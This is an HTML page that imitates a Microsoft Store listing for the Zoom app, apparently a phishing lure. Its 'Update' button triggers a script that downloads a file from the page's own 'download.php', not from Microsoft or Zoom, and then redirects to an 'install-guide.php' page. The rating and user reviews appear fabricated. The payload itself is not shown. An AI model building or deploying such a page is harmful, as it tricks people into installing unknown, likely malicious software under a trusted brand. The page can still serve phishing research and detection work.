<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Zoom - Microsoft Store</title>
  <link rel="icon" type="image/png" href="https://st1.zoom.us/zoom.ico">
  <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600&display=swap" rel="stylesheet" />
  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, sans-serif;
      background-color: #f8f9fa;
      color: #1a1a1a;
    }

    nav {
      background-color: #ffffff;
      border-bottom: 1px solid #e6e6e6;
      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.04);
    }

    .nav-container {
      max-width: 1400px;
      margin: 0 auto;
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 0 48px;
      height: 48px;
    }

    .nav-left {
      display: flex;
      align-items: center;
      gap: 32px;
    }

    .nav-left a {
      text-decoration: none;
      color: #1a1a1a;
      font-weight: 600;
      font-size: 13px;
      transition: color 0.2s ease;
    }

    .nav-left a:hover {
      color: #0067b8;
      text-decoration: underline;
    }

    .nav-left img {
      height: 23px;
    }

    .nav-right {
      display: flex;
      align-items: center;
      gap: 16px;
    }

    .nav-right input {
      padding: 8px 16px;
      border-radius: 20px;
      border: 1px solid #d1d1d1;
      font-size: 14px;
      width: 240px;
      background: #f8f9fa;
      transition: all 0.2s ease;
    }

    .nav-right input:focus {
      outline: none;
      border-color: #0067b8;
      background: white;
    }

    .nav-right input::placeholder {
      color: #666;
    }

    header {
      display: flex;
      align-items: center;
      padding: 32px 48px;
      background-color: #ffffff;
      border-bottom: 1px solid #e6e6e6;
    }

    .logo {
      width: 64px;
      height: 64px;
      margin-right: 16px;
      border-radius: 8px;
    }

    .app-name {
      font-size: 28px;
      font-weight: 600;
      color: #1a1a1a;
    }

    .main {
      max-width: 1400px;
      margin: 0 auto;
      padding: 48px;
      display: grid;
      grid-template-columns: 320px 1fr;
      gap: 48px;
    }

    .app-icon {
      position: sticky;
      top: 24px;
    }

    .app-icon img {
      width: 100%;
      border-radius: 12px;
      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.12);
    }

    .info h1 {
      font-size: 36px;
      margin-bottom: 8px;
      font-weight: 600;
      color: #1a1a1a;
    }

    .developer {
      color: #666;
      font-size: 14px;
      margin-bottom: 24px;
      font-weight: 500;
    }

    .rating-section {
      display: flex;
      align-items: center;
      gap: 16px;
      margin-bottom: 24px;
      padding: 16px;
      background: #f8f9fa;
      border-radius: 8px;
    }

    .rating-stars {
      font-size: 20px;
      color: #ffb900;
    }

    .rating-count {
      color: #666;
      font-size: 14px;
    }

    .install-btn {
      background-color: #0067b8;
      color: white;
      font-weight: 600;
      font-size: 15px;
      border: none;
      padding: 12px 32px;
      border-radius: 4px;
      cursor: pointer;
      margin-bottom: 32px;
      display: inline-flex;
      align-items: center;
      gap: 8px;
      transition: all 0.2s ease;
      min-width: 140px;
      justify-content: center;
    }

    .install-btn:hover {
      background-color: #005a9e;
      transform: translateY(-1px);
      box-shadow: 0 4px 12px rgba(0, 103, 184, 0.3);
    }

    .install-btn:disabled {
      background-color: #ccc;
      cursor: not-allowed;
      opacity: 0.7;
      transform: none;
      box-shadow: none;
    }

    .screenshots {
      display: flex;
      gap: 16px;
      overflow-x: auto;
      padding: 16px 0;
      margin-bottom: 32px;
      scrollbar-width: thin;
    }

    .screenshots::-webkit-scrollbar {
      height: 8px;
    }

    .screenshots::-webkit-scrollbar-track {
      background: #f1f1f1;
      border-radius: 4px;
    }

    .screenshots::-webkit-scrollbar-thumb {
      background: #c1c1c1;
      border-radius: 4px;
    }

    .screenshots img {
      height: 360px;
      border-radius: 8px;
      flex-shrink: 0;
      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
      transition: transform 0.2s ease;
    }

    .screenshots img:hover {
      transform: scale(1.02);
    }

    .description {
      margin-top: 32px;
      font-size: 16px;
      line-height: 1.7;
      color: #333;
    }

    .description p {
      margin-bottom: 16px;
    }

    .reviews {
      margin-top: 48px;
      padding-top: 32px;
      border-top: 2px solid #e6e6e6;
    }

    .reviews h2 {
      font-size: 24px;
      margin-bottom: 24px;
      font-weight: 600;
    }

    .review {
      margin-bottom: 20px;
      background-color: #fff;
      padding: 20px;
      border-radius: 8px;
      border: 1px solid #e6e6e6;
    }

    .stars {
      font-size: 18px;
      color: #ffb900;
      margin-bottom: 8px;
    }

    .review-text {
      font-size: 15px;
      color: #333;
      margin-bottom: 8px;
      line-height: 1.5;
    }

    .review-author {
      font-size: 13px;
      color: #666;
      font-weight: 500;
    }

    @media (max-width: 1024px) {
      .main {
        grid-template-columns: 1fr;
        padding: 24px;
      }

      .app-icon {
        position: static;
        max-width: 200px;
        margin: 0 auto 24px;
      }

      .nav-container {
        padding: 0 24px;
      }

      header {
        padding: 24px;
      }

      .screenshots img {
        height: 280px;
      }

      .nav-right input {
        width: 160px;
      }
    }
  </style>
</head>

<body>

  <!-- Navigation -->
  <nav>
    <div class="nav-container">
      <div class="nav-left">
        <a href="#"><img src="./img/microsoft-logo-dark-1.png" alt="Microsoft"></a>
        <a href="#">Microsoft Store</a>
        <a href="#">Apps</a>
        <a href="#">Games</a>
        <a href="#">Movies & TV</a>
        <a href="#">Devices</a>
      </div>
      <div class="nav-right">
        <input type="text" placeholder="Search apps, games, movies, and more" />
      </div>
    </div>
  </nav>

  <!-- Page Header -->
  <header>
    <img src="./img/zoom-icon.webp" alt="Zoom App Icon" class="logo" />
    <span class="app-name">Zoom for Meetings</span>
  </header>

  <!-- Main Content -->
  <section class="main">
    <div class="app-icon">
      <img src="./img/zoom-icon.webp" alt="Zoom Icon" />
    </div>

    <div class="info">
      <h1>Zoom – One Platform to Connect</h1>
      <div class="developer">Zoom Video Communications, Inc.</div>

      <div class="rating-section">
        <div class="rating-stars">★★★★☆</div>
        <div class="rating-count">4.5 stars • 2.3M reviews</div>
      </div>

      <!-- Download Button -->
      <button class="install-btn" id="downloadBtn" type="button">
        <span id="btnText">Update</span>
      </button>

      <div class="screenshots">
        <img src="./img/sc1.png" alt="Zoom screenshot 1" />
        <img src="./img/sc2.png" alt="Zoom screenshot 2" />
        <img src="./img/sc3.png" alt="Zoom screenshot 3" />
      </div>

      <div class="description">
        <p>
          <strong>Zoom is the leader in modern enterprise video communications</strong>, with an easy, reliable cloud platform for video and audio conferencing, chat, and webinars across mobile devices, desktops, telephones, and room systems.
        </p>
        <p>
          Stay connected wherever you go – start or join a secure meeting with flawless video, crystal clear audio, instant screen sharing, and cross-platform instant messaging – for free!
        </p>
        <p>
          Zoom is #1 in customer satisfaction and the best unified communication experience on mobile. It's super easy! Install the free Zoom app, click on "New Meeting," and invite up to 100 people to join you on video!
        </p>
      </div>

      <div class="reviews">
        <h2>User Reviews</h2>
        <div class="review">
          <div class="stars">★★★★★</div>
          <p class="review-text">“Zoom makes remote meetings seamless. Easy to use and reliable.”</p>
          <p class="review-author">– Sarah K.</p>
        </div>
        <div class="review">
          <div class="stars">★★★★☆</div>
          <p class="review-text">“Great for webinars and team chats. Minor bugs occasionally.”</p>
          <p class="review-author">– Mark T.</p>
        </div>
        <div class="review">
          <div class="stars">★★★☆☆</div>
          <p class="review-text">“Good features, but could be more lightweight on battery.”</p>
          <p class="review-author">– Dana P.</p>
        </div>
      </div>
    </div>
  </section>

  <!-- Working Download Script -->
  <script>
    const btn = document.getElementById('downloadBtn');
    const btnText = document.getElementById('btnText');

    function startDownload() {
      if (btn.disabled) return; // Prevent double trigger
      btnText.textContent = 'Starting download...';
      btn.disabled = true;

      const link = document.createElement('a');
      link.href = '../download.php';
      link.setAttribute('download', '');
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);

      setTimeout(() => {
        window.location.href = 'install-guide.php';
      }, 10000);
    }

    // Manual click only
    btn.addEventListener('click', startDownload);
  </script>

  </script>
  <script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"rayId":"9cdf2e24cb93a580","version":"2025.9.1","r":1,"token":"0fd78295dc8b43c19357571e1f114c81","serverTiming":{"name":{"cfExtPri":true,"cfEdge":true,"cfOrigin":true,"cfL4":true,"cfSpeedBrain":true,"cfCacheStatus":true}}}' crossorigin="anonymous"></script>
  <script defer src="https://static.cloudflareinsights.com/beacon.min.js/v8c78df7c7c0f484497ecbca7046644da1771523124516" integrity="sha512-8DS7rgIrAmghBFwoOTujcf6D9rXvH8xm8JQ1Ja01h9QX8EzXldiszufYa4IFfKdLUKTTrnSFXLDkUEOTrZQ8Qg==" data-cf-beacon='{"version":"2024.11.0","token":"098d0766a6c04db7a20d7bcd64a6fd67","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
</body>

</html>